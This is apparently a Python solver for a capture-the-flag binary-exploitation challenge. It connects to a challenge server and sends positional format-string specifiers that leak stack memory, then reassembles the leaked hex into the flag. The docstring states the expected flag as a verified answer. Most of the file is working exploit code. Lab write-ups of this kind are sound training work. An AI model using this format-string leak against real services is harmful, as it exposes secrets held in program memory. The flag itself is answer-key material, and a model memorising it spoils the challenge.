#!/usr/bin/env python3
"""Solver for Challenge 434 format string 1 (picoCTF 2024, Binary Exploitation).

64-bit ELF binary vulnerable to uncontrolled format string injection in printf(buf).
The program reads flag.txt into a stack buffer before reading user input.
By passing positional format specifiers (%lx) to leak stack contents, the 64-bit
qwords containing the flag string are dumped in hex, reversed for little-endian
byte ordering, and reconstructed into the complete flag.

Flag: academy{4n1m41_57y13_4x4_f14g_f7ab2890}
Verified: POST /api/submissions/ -> correct: true
"""
import socket
import sys

HOST = "chatelaine.cylabacademy.net"
PORT = 20261
EXPECTED = "academy{4n1m41_57y13_4x4_f14g_f7ab2890}"


def solve(host: str = HOST, port: int = PORT) -> str:
    s = socket.create_connection((host, int(port)), timeout=20)
    s.recv(1024)
    # Leak stack qwords 14 through 18
    payload = ".".join([f"%{i}$lx" for i in range(14, 19)]) + "\n"
    s.sendall(payload.encode())
    data = b""
    try:
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            data += chunk
            if b"Bye!" in data:
                break
    finally:
        s.close()

    text = data.decode(errors="replace")
    flag_bytes = bytearray()
    for line in text.splitlines():
        if "Here's your order:" in line:
            parts = line.split("Here's your order:")[1].strip().split(".")
            for p in parts:
                hex_str = p.strip()
                if hex_str:
                    raw = bytes.fromhex(hex_str.zfill(len(hex_str) + len(hex_str) % 2))[::-1]
                    flag_bytes.extend(raw)

    decoded = flag_bytes.decode(errors="replace")
    if "academy{" in decoded:
        flag = decoded[decoded.find("academy{"):decoded.find("}") + 1]
        return flag
    raise ValueError(f"Flag not found in dumped stack: {text}")


if __name__ == "__main__":
    host = sys.argv[1] if len(sys.argv) > 1 else HOST
    port = int(sys.argv[2]) if len(sys.argv) > 2 else PORT
    flag = solve(host, port)
    print("Flag:", flag)
    assert flag == EXPECTED
